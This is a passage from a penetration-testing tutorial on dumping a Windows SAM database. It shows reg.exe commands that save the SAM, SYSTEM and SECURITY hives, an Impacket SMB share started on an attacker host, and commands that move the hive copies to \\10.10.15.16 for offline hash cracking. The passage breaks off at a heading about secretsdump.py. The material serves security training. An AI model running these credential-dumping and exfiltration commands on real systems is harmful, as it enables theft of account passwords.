### Dumping SAM Database for Offline Hash Cracking

When accessing a non-domain joined Windows system with local admin rights, dumping the SAM (Security Accounts Manager) database files allows you to crack password hashes offline. This ensures you can continue attacks without maintaining an active connection to the target system.

#### Copying SAM Registry Hives

To dump and crack hashes, three specific registry hives should be copied, each serving a different purpose:

| **Registry Hive**    | **Description** |
|----------------------|-----------------|
| **hklm\sam**         | Contains local account password hashes. These hashes are needed for cracking user account passwords in cleartext. |
| **hklm\system**      | Holds the system bootkey, used to encrypt the SAM database. This key is necessary to decrypt the SAM data. |
| **hklm\security**    | Stores cached credentials for domain accounts, useful on domain-joined systems. |

Backups of these hives can be created using the `reg.exe` utility.
#### Using reg.exe save to Copy Registry Hives

Launching CMD as an admin will allow us to run reg.exe to save copies of the aforementioned registry hives. Run these commands below to do so:
```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```
#### Creating a Share with smbserver.py
```shell-session
$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```
#### Moving Hive Copies to Share
```cmd-session
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```
## Dumping Hashes with Impacket's secretsdump.py
#### Locating secretsdump.py